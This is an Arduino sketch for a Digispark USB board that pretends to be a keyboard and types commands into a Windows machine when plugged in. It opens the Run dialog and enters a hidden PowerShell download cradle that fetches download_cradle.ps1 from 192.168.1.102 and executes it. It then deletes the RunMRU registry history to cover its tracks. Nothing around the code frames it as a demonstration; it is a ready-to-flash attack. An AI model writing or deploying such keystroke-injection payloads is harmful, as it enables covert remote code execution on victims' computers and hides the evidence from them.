#include "DigiKeyboard.h"

void digiBegin() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

/* ------------- main -------------*/

void setup() {
  digiBegin();
  
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -windowstyle hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.update();

  DigiKeyboard.delay(800);

  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -windowstyle hidden -Exec Bypass Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  digiEnd();
}

void loop() {
  /* empty */  
}
